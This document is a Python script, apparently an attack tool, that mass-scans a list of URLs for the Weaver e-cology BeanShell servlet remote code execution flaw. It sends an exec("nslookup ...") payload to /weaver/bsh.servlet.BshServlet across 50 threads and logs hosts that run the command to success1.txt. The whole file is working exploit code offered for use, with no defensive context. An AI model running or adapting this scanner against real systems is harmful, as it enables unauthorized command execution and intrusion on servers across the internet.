# -*- coding:utf-8 -*-
# author:f0ngf0ng
import threading
import time
from queue import Queue
import requests

event = threading.Event()
event.set()
q = Queue(0)
s = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
exitFlag = 0

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

class maint():
    def __init__(self,url,num):
        self.url = url
        self.num = num

    def fff(self):
        url = self.url


        data = 'bsh.script=exec("nslookup www.baidu.com");&bsh.servlet.captureOutErr=true& bsh.servlet.output=raw&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'

        try:
            a = requests.post(url + "/weaver/bsh.servlet.BshServlet", data=data, timeout=3, headers=headers)

            if "shifen" in a.text:
                with open("success1.txt", "a+") as file:
                    file.writelines(url + '\n')

        except:
            pass

class myThread (threading.Thread):
    def __init__(self, q, num):
        threading.Thread.__init__(self)
        self.q = q
        self.num = num
        print(num)

    def run(self):
        while event.is_set():
            if self.q.empty():
                break
            else:
                sql_spot = maint(self.q.get(),self.num)
                sql_spot.fff()

def scan_thread(q):
    thread_num = 50
    threads = []
    for num in range(1,thread_num+1):
        t = myThread(q,num)
        threads.append(t)
        t.start()
    for t in threads:
        print(t)
        t.join()

def open_urls():                                                                             #
    url_path = r'total.txt'
    f = open(url_path, 'r',encoding='utf-8')
    for each_line in f:
        q.put(each_line)
    return q

if __name__ == '__main__':
    open_urls()
    scan_thread(q)